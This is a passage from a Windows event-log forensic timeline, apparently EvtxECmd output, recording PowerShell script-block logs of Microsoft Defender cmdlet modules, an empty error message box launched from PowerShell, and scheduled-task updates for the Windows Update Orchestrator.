,",,4104,,DESKTOP-704R550,,,,,,,EventLogs/20250503043822_EvtxECmd_Output.csv,
2025-05-03T04:01:02.1630492,Event Time,Event Logs,EZ Tools,Contains contents of scripts run,Microsoft-Windows-PowerShell/Operational,"Channel: Microsoft-Windows-PowerShell/Operational | Computer: DESKTOP-704R550 | Path:  | ScriptBlockText: , #requires -version 3.0, try { Microsoft.PowerShell.Core/Set-StrictMode -Off } catch { }, $script:MyModule = $MyInvocation.MyCommand.ScriptBlock.Module, $script:ClassName = 'ROOT/Microsoft/Windows/Defender/MSFT_MpThreatCatalog', $script:ClassVersion = '1.0', $script:ModuleVersion = '1.0', $script:ObjectModelWrapper = [Microsoft.PowerShell.Cmdletization.Cim.CimCmdletAdapter], $script:PrivateData = [System.Collections.Generic.Dictionary[string,string]]::new(), Microsoft.PowerShell.Core/Export-ModuleMember -Function @(),         , function __cmdletization_BindCommonParameters, {,     param(,         $__cmdletization_objectModelWrapper,,         $myPSBoundParameters,     )       ,                 ,         if ($myPSBoundParameters.ContainsKey('CimSession')) { ,             $__cmdletization_objectModelWrapper.PSObject.Properties['CimSession'].Value = $myPSBoundParameters['CimSession'] ,         },                     ,         if ($myPSBoundParameters.ContainsKey('ThrottleLimit')) { ,             $__cmdletization_objectModelWrapper.PSObject.Properties['ThrottleLimit'].Value = $myPSBoundParameters['ThrottleLimit'] ,         },                     ,         if ($myPSBoundParameters.ContainsKey('AsJob')) { ,             $__cmdletization_objectModelWrapper.PSObject.Properties['AsJob'].Value = $myPSBoundParameters['AsJob'] ,         },                     , },                 , function Get-MpThreatCatalog, {,     [CmdletBinding(DefaultParameterSetName='DefaultSet', PositionalBinding=$false)],     ,     [OutputType([Microsoft.Management.Infrastructure.CimInstance])], [OutputType('Microsoft.Management.Infrastructure.CimInstance#ROOT/Microsoft/Windows/Defender/MSFT_MpThreatCatalog')],     param(,     ,     [Parameter(ParameterSetName='ById')],     [Alias('ID')],     [ValidateNotNull()],     [long[]],     ${ThreatID},,     [Parameter(ParameterSetName='ById')],     [Alias('Session')],     [ValidateNotNullOrEmpty()],     [CimSession[]],     ${CimSession},,     [Parameter(ParameterSetName='ById')],     [int],     ${ThrottleLimit},,     [Parameter(ParameterSetName='ById')],     [switch],     ${AsJob}),     DynamicParam {,         try ,         {,             if (-not $__cmdletization_exceptionHasBeenThrown),             {,                 $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new(),                 $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData),                 if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters]),                 {,                     ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters(),                 },             },         },         catch,         {,             $__cmdletization_exceptionHasBeenThrown = $true,             throw,         },     },     Begin {,         $__cmdletization_exceptionHasBeenThrown = $false,         try ,         {,             __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters,             $__cmdletization_objectModelWrapper.BeginProcessing(),         },         catch,         {,             $__cmdletization_exceptionHasBeenThrown = $true,             throw,         },     },         ,     Process {,         try ,         {,             if (-not $__cmdletization_exceptionHasBeenThrown),             {,     $__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder(),     if ($PSBoundParameters.ContainsKey('ThreatID') -and (@('ById') -contains $PSCmdlet.ParameterSetName )) {,         $__cmdletization_values = @(${ThreatID}),         $__cmdletization_queryBuilder.FilterByProperty('ThreatID', $__cmdletization_values, $false, 'Default'),     },     $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder),             },         },         catch,         {,             $__cmdletization_exceptionHasBeenThrown = $true,             throw,         },     },         ,     End {,         try,         {,             if (-not $__cmdletization_exceptionHasBeenThrown),             {,                 $__cmdletization_objectModelWrapper.EndProcessing(),             },         },         catch,         {,             throw,         },     },     # .EXTERNALHELP MSFT_MpThreatCatalog.cdxml-Help.xml, }, Microsoft.PowerShell.Core/Export-ModuleMember -Function 'Get-MpThreatCatalog' -Alias '*',         ,",,4104,,DESKTOP-704R550,,,,,,,EventLogs/20250503043822_EvtxECmd_Output.csv,
2025-05-03T04:01:02.2123300,Event Time,Event Logs,EZ Tools,Contains contents of scripts run,Microsoft-Windows-PowerShell/Operational,"Channel: Microsoft-Windows-PowerShell/Operational | Computer: DESKTOP-704R550 | Path:  | ScriptBlockText: , #requires -version 3.0, try { Microsoft.PowerShell.Core/Set-StrictMode -Off } catch { }, $script:MyModule = $MyInvocation.MyCommand.ScriptBlock.Module, $script:ClassName = 'ROOT/Microsoft/Windows/Defender/MSFT_MpThreatDetection', $script:ClassVersion = '1.0', $script:ModuleVersion = '1.0', $script:ObjectModelWrapper = [Microsoft.PowerShell.Cmdletization.Cim.CimCmdletAdapter], $script:PrivateData = [System.Collections.Generic.Dictionary[string,string]]::new(), Microsoft.PowerShell.Core/Export-ModuleMember -Function @(),         , function __cmdletization_BindCommonParameters, {,     param(,         $__cmdletization_objectModelWrapper,,         $myPSBoundParameters,     )       ,                 ,         if ($myPSBoundParameters.ContainsKey('CimSession')) { ,             $__cmdletization_objectModelWrapper.PSObject.Properties['CimSession'].Value = $myPSBoundParameters['CimSession'] ,         },                     ,         if ($myPSBoundParameters.ContainsKey('ThrottleLimit')) { ,             $__cmdletization_objectModelWrapper.PSObject.Properties['ThrottleLimit'].Value = $myPSBoundParameters['ThrottleLimit'] ,         },                     ,         if ($myPSBoundParameters.ContainsKey('AsJob')) { ,             $__cmdletization_objectModelWrapper.PSObject.Properties['AsJob'].Value = $myPSBoundParameters['AsJob'] ,         },                     , },                 , function Get-MpThreatDetection, {,     [CmdletBinding(DefaultParameterSetName='DefaultSet', PositionalBinding=$false)],     ,     [OutputType([Microsoft.Management.Infrastructure.CimInstance])], [OutputType('Microsoft.Management.Infrastructure.CimInstance#ROOT/Microsoft/Windows/Defender/MSFT_MpThreatDetection')],     param(,     ,     [Parameter(ParameterSetName='ById')],     [Alias('ID')],     [ValidateNotNull()],     [long[]],     ${ThreatID},,     [Parameter(ParameterSetName='ById')],     [Alias('Session')],     [ValidateNotNullOrEmpty()],     [CimSession[]],     ${CimSession},,     [Parameter(ParameterSetName='ById')],     [int],     ${ThrottleLimit},,     [Parameter(ParameterSetName='ById')],     [switch],     ${AsJob}),     DynamicParam {,         try ,         {,             if (-not $__cmdletization_exceptionHasBeenThrown),             {,                 $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new(),                 $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData),                 if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters]),                 {,                     ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters(),                 },             },         },         catch,         {,             $__cmdletization_exceptionHasBeenThrown = $true,             throw,         },     },     Begin {,         $__cmdletization_exceptionHasBeenThrown = $false,         try ,         {,             __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters,             $__cmdletization_objectModelWrapper.BeginProcessing(),         },         catch,         {,             $__cmdletization_exceptionHasBeenThrown = $true,             throw,         },     },         ,     Process {,         try ,         {,             if (-not $__cmdletization_exceptionHasBeenThrown),             {,     $__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder(),     if ($PSBoundParameters.ContainsKey('ThreatID') -and (@('ById') -contains $PSCmdlet.ParameterSetName )) {,         $__cmdletization_values = @(${ThreatID}),         $__cmdletization_queryBuilder.FilterByProperty('ThreatID', $__cmdletization_values, $false, 'Default'),     },     $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder),             },         },         catch,         {,             $__cmdletization_exceptionHasBeenThrown = $true,             throw,         },     },         ,     End {,         try,         {,             if (-not $__cmdletization_exceptionHasBeenThrown),             {,                 $__cmdletization_objectModelWrapper.EndProcessing(),             },         },         catch,         {,             throw,         },     },     # .EXTERNALHELP MSFT_MpThreatDetection.cdxml-Help.xml, }, Microsoft.PowerShell.Core/Export-ModuleMember -Function 'Get-MpThreatDetection' -Alias '*',         ,",,4104,,DESKTOP-704R550,,,,,,,EventLogs/20250503043822_EvtxECmd_Output.csv,
2025-05-03T04:01:02.2306266,Event Time,Event Logs,EZ Tools,Contains contents of scripts run,Microsoft-Windows-PowerShell/Operational,"Channel: Microsoft-Windows-PowerShell/Operational | Computer: DESKTOP-704R550 | Path:  | ScriptBlockText: , #requires -version 3.0, try { Microsoft.PowerShell.Core/Set-StrictMode -Off } catch { }, $script:MyModule = $MyInvocation.MyCommand.ScriptBlock.Module, $script:ClassName = 'ROOT/Microsoft/Windows/Defender/MSFT_MpScan', $script:ClassVersion = '1.0', $script:ModuleVersion = '1.0', $script:ObjectModelWrapper = [Microsoft.PowerShell.Cmdletization.Cim.CimCmdletAdapter], $script:PrivateData = [System.Collections.Generic.Dictionary[string,string]]::new(), Microsoft.PowerShell.Core/Export-ModuleMember -Function @(),         , function __cmdletization_BindCommonParameters, {,     param(,         $__cmdletization_objectModelWrapper,,         $myPSBoundParameters,     )       ,                 ,         if ($myPSBoundParameters.ContainsKey('CimSession')) { ,             $__cmdletization_objectModelWrapper.PSObject.Properties['CimSession'].Value = $myPSBoundParameters['CimSession'] ,         },                     ,         if ($myPSBoundParameters.ContainsKey('ThrottleLimit')) { ,             $__cmdletization_objectModelWrapper.PSObject.Properties['ThrottleLimit'].Value = $myPSBoundParameters['ThrottleLimit'] ,         },                     ,         if ($myPSBoundParameters.ContainsKey('AsJob')) { ,             $__cmdletization_objectModelWrapper.PSObject.Properties['AsJob'].Value = $myPSBoundParameters['AsJob'] ,         },                     , },                 , function Start-MpScan, {,     [CmdletBinding(PositionalBinding=$false)],     ,     ,     param(,     ,     [Parameter(ParameterSetName='Start0')],     [ValidateNotNull()],     [ValidateNotNullOrEmpty()],     [string],     ${ScanPath},,     [Parameter(ParameterSetName='Start0')],     [ValidateNotNull()],     [ValidateNotNullOrEmpty()],     [ValidateSet('FullScan','QuickScan','CustomScan')],     [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpScan.ScanType],     ${ScanType},,     [Parameter(ParameterSetName='Start0')],     [Alias('Session')],     [ValidateNotNullOrEmpty()],     [CimSession[]],     ${CimSession},,     [Parameter(ParameterSetName='Start0')],     [int],     ${ThrottleLimit},,     [Parameter(ParameterSetName='Start0')],     [switch],     ${AsJob}),     DynamicParam {,         try ,         {,             if (-not $__cmdletization_exceptionHasBeenThrown),             {,                 $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new(),                 $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData),                 if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters]),                 {,                     ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters(),                 },             },         },         catch,         {,             $__cmdletization_exceptionHasBeenThrown = $true,             throw,         },     },     Begin {,         $__cmdletization_exceptionHasBeenThrown = $false,         try ,         {,             __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters,             $__cmdletization_objectModelWrapper.BeginProcessing(),         },         catch,         {,             $__cmdletization_exceptionHasBeenThrown = $true,             throw,         },     },         ,     Process {,         try ,         {,             if (-not $__cmdletization_exceptionHasBeenThrown),             {,       $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new(),         [object]$__cmdletization_defaultValue = $null,         [object]$__cmdletization_defaultValueIsPresent = $false,         if ($PSBoundParameters.ContainsKey('ScanPath')) {,           [object]$__cmdletization_value = ${ScanPath},           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanPath'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true},         } else {,           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanPath'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent},         },         $__cmdletization_methodParameters.Add($__cmdletization_methodParameter),         [object]$__cmdletization_defaultValue = $null,         [object]$__cmdletization_defaultValueIsPresent = $false,         if ($PSBoundParameters.ContainsKey('ScanType')) {,           [object]$__cmdletization_value = ${ScanType},           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanType'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpScan.ScanType'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true},         } else {,           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanType'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpScan.ScanType'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent},         },         $__cmdletization_methodParameters.Add($__cmdletization_methodParameter),       $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false },       $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('Start', $__cmdletization_methodParameters, $__cmdletization_returnValue),       $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo),             },         },         catch,         {,             $__cmdletization_exceptionHasBeenThrown = $true,             throw,         },     },         ,     End {,         try,         {,             if (-not $__cmdletization_exceptionHasBeenThrown),             {,                 $__cmdletization_objectModelWrapper.EndProcessing(),             },         },         catch,         {,             throw,         },     },     # .EXTERNALHELP MSFT_MpScan.cdxml-Help.xml, }, Microsoft.PowerShell.Core/Export-ModuleMember -Function 'Start-MpScan' -Alias '*',         ,",,4104,,DESKTOP-704R550,,,,,,,EventLogs/20250503043822_EvtxECmd_Output.csv,
2025-05-03T04:01:02.2491021,Event Time,Event Logs,EZ Tools,Contains contents of scripts run,Microsoft-Windows-PowerShell/Operational,"Channel: Microsoft-Windows-PowerShell/Operational | Computer: DESKTOP-704R550 | Path:  | ScriptBlockText: , #requires -version 3.0, try { Microsoft.PowerShell.Core/Set-StrictMode -Off } catch { }, $script:MyModule = $MyInvocation.MyCommand.ScriptBlock.Module, $script:ClassName = 'ROOT/Microsoft/Windows/Defender/MSFT_MpSignature', $script:ClassVersion = '1.0', $script:ModuleVersion = '1.0', $script:ObjectModelWrapper = [Microsoft.PowerShell.Cmdletization.Cim.CimCmdletAdapter], $script:PrivateData = [System.Collections.Generic.Dictionary[string,string]]::new(), Microsoft.PowerShell.Core/Export-ModuleMember -Function @(),         , function __cmdletization_BindCommonParameters, {,     param(,         $__cmdletization_objectModelWrapper,,         $myPSBoundParameters,     )       ,                 ,         if ($myPSBoundParameters.ContainsKey('CimSession')) { ,             $__cmdletization_objectModelWrapper.PSObject.Properties['CimSession'].Value = $myPSBoundParameters['CimSession'] ,         },                     ,         if ($myPSBoundParameters.ContainsKey('ThrottleLimit')) { ,             $__cmdletization_objectModelWrapper.PSObject.Properties['ThrottleLimit'].Value = $myPSBoundParameters['ThrottleLimit'] ,         },                     ,         if ($myPSBoundParameters.ContainsKey('AsJob')) { ,             $__cmdletization_objectModelWrapper.PSObject.Properties['AsJob'].Value = $myPSBoundParameters['AsJob'] ,         },                     , },                 , function Update-MpSignature, {,     [CmdletBinding(PositionalBinding=$false)],     ,     ,     param(,     ,     [Parameter(ParameterSetName='Update0')],     [AllowEmptyString()],     [AllowNull()],     [ValidateNotNull()],     [ValidateNotNullOrEmpty()],     [ValidateSet('InternalDefinitionUpdateServer','MicrosoftUpdateServer','MMPC','FileShares')],     [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpSignature.UpdateSource],     ${UpdateSource},,     [Parameter(ParameterSetName='Update0')],     [Alias('Session')],     [ValidateNotNullOrEmpty()],     [CimSession[]],     ${CimSession},,     [Parameter(ParameterSetName='Update0')],     [int],     ${ThrottleLimit},,     [Parameter(ParameterSetName='Update0')],     [switch],     ${AsJob}),     DynamicParam {,         try ,         {,             if (-not $__cmdletization_exceptionHasBeenThrown),             {,                 $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new(),                 $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData),                 if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters]),                 {,                     ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters(),                 },             },         },         catch,         {,             $__cmdletization_exceptionHasBeenThrown = $true,             throw,         },     },     Begin {,         $__cmdletization_exceptionHasBeenThrown = $false,         try ,         {,             __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters,             $__cmdletization_objectModelWrapper.BeginProcessing(),         },         catch,         {,             $__cmdletization_exceptionHasBeenThrown = $true,             throw,         },     },         ,     Process {,         try ,         {,             if (-not $__cmdletization_exceptionHasBeenThrown),             {,       $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new(),         [object]$__cmdletization_defaultValue = $null,         [object]$__cmdletization_defaultValueIsPresent = $false,         if ($PSBoundParameters.ContainsKey('UpdateSource')) {,           [object]$__cmdletization_value = ${UpdateSource},           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'UpdateSource'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpSignature.UpdateSource'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true},         } else {,           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'UpdateSource'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpSignature.UpdateSource'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent},         },         $__cmdletization_methodParameters.Add($__cmdletization_methodParameter),       $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false },       $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('Update', $__cmdletization_methodParameters, $__cmdletization_returnValue),       $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo),             },         },         catch,         {,             $__cmdletization_exceptionHasBeenThrown = $true,             throw,         },     },         ,     End {,         try,         {,             if (-not $__cmdletization_exceptionHasBeenThrown),             {,                 $__cmdletization_objectModelWrapper.EndProcessing(),             },         },         catch,         {,             throw,         },     },     # .EXTERNALHELP MSFT_MpSignature.cdxml-Help.xml, }, Microsoft.PowerShell.Core/Export-ModuleMember -Function 'Update-MpSignature' -Alias '*',         ,",,4104,,DESKTOP-704R550,,,,,,,EventLogs/20250503043822_EvtxECmd_Output.csv,
2025-05-03T04:01:02.2681784,Event Time,Event Logs,EZ Tools,Contains contents of scripts run,Microsoft-Windows-PowerShell/Operational,"Channel: Microsoft-Windows-PowerShell/Operational | Computer: DESKTOP-704R550 | Path:  | ScriptBlockText: , #requires -version 3.0, try { Microsoft.PowerShell.Core/Set-StrictMode -Off } catch { }, $script:MyModule = $MyInvocation.MyCommand.ScriptBlock.Module, $script:ClassName = 'ROOT/Microsoft/Windows/Defender/MSFT_MpWDOScan', $script:ClassVersion = '1.0', $script:ModuleVersion = '1.0', $script:ObjectModelWrapper = [Microsoft.PowerShell.Cmdletization.Cim.CimCmdletAdapter], $script:PrivateData = [System.Collections.Generic.Dictionary[string,string]]::new(), Microsoft.PowerShell.Core/Export-ModuleMember -Function @(),         , function __cmdletization_BindCommonParameters, {,     param(,         $__cmdletization_objectModelWrapper,,         $myPSBoundParameters,     )       ,                 ,         if ($myPSBoundParameters.ContainsKey('CimSession')) { ,             $__cmdletization_objectModelWrapper.PSObject.Properties['CimSession'].Value = $myPSBoundParameters['CimSession'] ,         },                     ,         if ($myPSBoundParameters.ContainsKey('ThrottleLimit')) { ,             $__cmdletization_objectModelWrapper.PSObject.Properties['ThrottleLimit'].Value = $myPSBoundParameters['ThrottleLimit'] ,         },                     ,         if ($myPSBoundParameters.ContainsKey('AsJob')) { ,             $__cmdletization_objectModelWrapper.PSObject.Properties['AsJob'].Value = $myPSBoundParameters['AsJob'] ,         },                     , },                 , function Start-MpWDOScan, {,     [CmdletBinding(PositionalBinding=$false)],     ,     ,     param(,     ,     [Parameter(ParameterSetName='Start0')],     [Alias('Session')],     [ValidateNotNullOrEmpty()],     [CimSession[]],     ${CimSession},,     [Parameter(ParameterSetName='Start0')],     [int],     ${ThrottleLimit},,     [Parameter(ParameterSetName='Start0')],     [switch],     ${AsJob}),     DynamicParam {,         try ,         {,             if (-not $__cmdletization_exceptionHasBeenThrown),             {,                 $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new(),                 $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData),                 if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters]),                 {,                     ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters(),                 },             },         },         catch,         {,             $__cmdletization_exceptionHasBeenThrown = $true,             throw,         },     },     Begin {,         $__cmdletization_exceptionHasBeenThrown = $false,         try ,         {,             __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters,             $__cmdletization_objectModelWrapper.BeginProcessing(),         },         catch,         {,             $__cmdletization_exceptionHasBeenThrown = $true,             throw,         },     },         ,     Process {,         try ,         {,             if (-not $__cmdletization_exceptionHasBeenThrown),             {,       $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new(),       $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false },       $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('Start', $__cmdletization_methodParameters, $__cmdletization_returnValue),       $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo),             },         },         catch,         {,             $__cmdletization_exceptionHasBeenThrown = $true,             throw,         },     },         ,     End {,         try,         {,             if (-not $__cmdletization_exceptionHasBeenThrown),             {,                 $__cmdletization_objectModelWrapper.EndProcessing(),             },         },         catch,         {,             throw,         },     },     # .EXTERNALHELP MSFT_MpWDOScan.cdxml-Help.xml, }, Microsoft.PowerShell.Core/Export-ModuleMember -Function 'Start-MpWDOScan' -Alias '*',         ,",,4104,,DESKTOP-704R550,,,,,,,EventLogs/20250503043822_EvtxECmd_Output.csv,
2025-05-03T04:01:03.5081581,Event Time,Event Logs,EZ Tools,Contains contents of scripts run,Microsoft-Windows-PowerShell/Operational,"Channel: Microsoft-Windows-PowerShell/Operational | Computer: DESKTOP-704R550 | Path:  | ScriptBlockText: Add-Type -AssemblyName System.Windows.Forms;, [System.Windows.Forms.MessageBox]::Show('', '', 'OK', 'Error');",,4104,,DESKTOP-704R550,,,,,,,EventLogs/20250503043822_EvtxECmd_Output.csv,
2025-05-03T04:01:04.9683015,Event Time,Event Logs,EZ Tools,Pipeline executed,Microsoft-Windows-PowerShell/Operational,"Channel: Microsoft-Windows-PowerShell/Operational | Computer: DESKTOP-704R550 | Command Name: Add-Type | Host Application = C:/Windows/System32/WindowsPowerShell/v1.0/powershell.exe Add-Type -AssemblyName System.Windows.Forms;, [System.Windows.Forms.MessageBox]::Show('', '', 'OK', 'Error'); | Script Name:  | ConnectedUser:  | Host Name: ConsoleHost | Payload: CommandInvocation(Add-Type): 'Add-Type', ParameterBinding(Add-Type): name='AssemblyName'; value='System.Windows.Forms',",,4103,DESKTOP-704R550/admin0x,DESKTOP-704R550,,,,,,,EventLogs/20250503043822_EvtxECmd_Output.csv,
2025-05-03T03:44:35.6061242,Event Time,Event Logs,EZ Tools,A scheduled task was updated,Security,"Channel: Security | Computer: DESKTOP-704R550 | TaskName: /Microsoft/Windows/UpdateOrchestrator/Schedule Work | TaskContentNew: &lt;?xml version='1.0' encoding='UTF-16'?&gt;, &lt;Task version='1.2' xmlns='http://schemas.microsoft.com/windows/2004/02/mit/task'&gt;,   &lt;RegistrationInfo&gt;,     &lt;URI&gt;/Microsoft/Windows/UpdateOrchestrator/Schedule Work&lt;/URI&gt;,     &lt;SecurityDescriptor&gt;D:P(A;;FA;;;SY)(A;;FRFX;;;LS)(A;;FRFX;;;BA)&lt;/SecurityDescriptor&gt;,   &lt;/RegistrationInfo&gt;,   &lt;Triggers&gt;,     &lt;TimeTrigger&gt;,       &lt;StartBoundary&gt;2025-05-03T05:48:35.000Z&lt;/StartBoundary&gt;,       &lt;Enabled&gt;true&lt;/Enabled&gt;,     &lt;/TimeTrigger&gt;,   &lt;/Triggers&gt;,   &lt;Principals&gt;,     &lt;Principal id='Author'&gt;,       &lt;RunLevel&gt;LeastPrivilege&lt;/RunLevel&gt;,       &lt;UserId&gt;S-1-5-18&lt;/UserId&gt;,     &lt;/Principal&gt;,   &lt;/Principals&gt;,   &lt;Settings&gt;,     &lt;MultipleInstancesPolicy&gt;IgnoreNew&lt;/MultipleInstancesPolicy&gt;,     &lt;DisallowStartIfOnBatteries&gt;true&lt;/DisallowStartIfOnBatteries&gt;,     &lt;StopIfGoingOnBatteries&gt;true&lt;/StopIfGoingOnBatteries&gt;,     &lt;AllowHardTerminate&gt;true&lt;/AllowHardTerminate&gt;,     &lt;StartWhenAvailable&gt;true&lt;/StartWhenAvailable&gt;,     &lt;RunOnlyIfNetworkAvailable&gt;false&lt;/RunOnlyIfNetworkAvailable&gt;,     &lt;IdleSettings&gt;,       &lt;Duration&gt;PT10M&lt;/Duration&gt;,       &lt;WaitTimeout&gt;PT1H&lt;/WaitTimeout&gt;,       &lt;StopOnIdleEnd&gt;true&lt;/StopOnIdleEnd&gt;,       &lt;RestartOnIdle&gt;false&lt;/RestartOnIdle&gt;,     &lt;/IdleSettings&gt;,     &lt;AllowStartOnDemand&gt;true&lt;/AllowStartOnDemand&gt;,     &lt;Enabled&gt;true&lt;/Enabled&gt;,     &lt;Hidden&gt;false&lt;/Hidden&gt;,     &lt;RunOnlyIfIdle&gt;false&lt;/RunOnlyIfIdle&gt;,     &lt;WakeToRun&gt;false&lt;/WakeToRun&gt;,     &lt;ExecutionTimeLimit&gt;PT72H&lt;/ExecutionTimeLimit&gt;,     &lt;Priority&gt;7&lt;/Priority&gt;,   &lt;/Settings&gt;,   &lt;Actions Context='Author'&gt;,     &lt;Exec&gt;,       &lt;Command&gt;%systemroot%/system32/usoclient.exe&lt;/Command&gt;,       &lt;Arguments&gt;StartWork&lt;/Arguments&gt;,     &lt;/Exec&gt;,   &lt;/Actions&gt;, &lt;/Task&gt;",,4702,WORKGROUP/DESKTOP-704R550$,DESKTOP-704R550,,,,,,,EventLogs/20250503043822_EvtxECmd_Output.csv,
2025-05-03T03:44:35.6611480,Event Time,Event Logs,EZ Tools,A scheduled task was updated,Security,"Channel: Security | Computer: DESKTOP-704R550 | TaskName: /Microsoft/Windows/UpdateOrchestrator/Schedule Work | TaskContentNew: &lt;?xml version='1.0' encoding='UTF-16'?&gt;, &lt;Task version='1.2' xmlns='http://schemas.microsoft.com/windows/2004/02/mit/task'&gt;,   &lt;RegistrationInfo&gt;,     &lt;URI&gt;/Microsoft/Windows/UpdateOrchestrator/Schedule Work&lt;/URI&gt;,     &lt;SecurityDescriptor&gt;D:P(A;;FA;;;SY)(A;;FRFX;;;LS)(A;;FRFX;;;BA)&lt;/SecurityDescriptor&gt;,   &lt;/RegistrationInfo&gt;,   &lt;Triggers&gt;,     &lt;TimeTrigger&gt;,       &lt;StartBoundary&gt;2025-05-03T05:48:35.000Z&lt;/StartBoundary&gt;,       &lt;Enabled&gt;true&lt;/Enabled&gt;,     &lt;/TimeTrigger&gt;,   &lt;/Triggers&gt;,   &lt;Principals&gt;,     &lt;Principal id='Author'&gt;,       &lt;UserId&gt;S-1-5-18&lt;/UserId&gt;,       &lt;RunLevel&gt;LeastPrivilege&lt;/RunLevel&gt;,     &lt;/Principal&gt;,   &lt;/Principals&gt;,   &lt;Settings&gt;,     &lt;MultipleInstancesPolicy&gt;IgnoreNew&lt;/MultipleInstancesPolicy&gt;,     &lt;DisallowStartIfOnBatteries&gt;true&lt;/DisallowStartIfOnBatteries&gt;,     &lt;StopIfGoingOnBatteries&gt;true&lt;/StopIfGoingOnBatteries&gt;,     &lt;AllowHardTerminate&gt;true&lt;/AllowHardTerminate&gt;,     &lt;StartWhenAvailable&gt;true&lt;/StartWhenAvailable&gt;,     &lt;RunOnlyIfNetworkAvailable&gt;false&lt;/RunOnlyIfNetworkAvailable&gt;,     &lt;IdleSettings&gt;,       &lt;Duration&gt;PT10M&lt;/Duration&gt;,       &lt;WaitTimeout&gt;PT1H&lt;/WaitTimeout&gt;,       &lt;StopOnIdleEnd&gt;true&lt;/StopOnIdleEnd&gt;,       &lt;RestartOnIdle&gt;false&lt;/RestartOnIdle&gt;,     &lt;/IdleSettings&gt;,     &lt;AllowStartOnDemand&gt;true&lt;/AllowStartOnDemand&gt;,     &lt;Enabled&gt;true&lt;/Enabled&gt;,     &lt;Hidden&gt;false&lt;/Hidden&gt;,     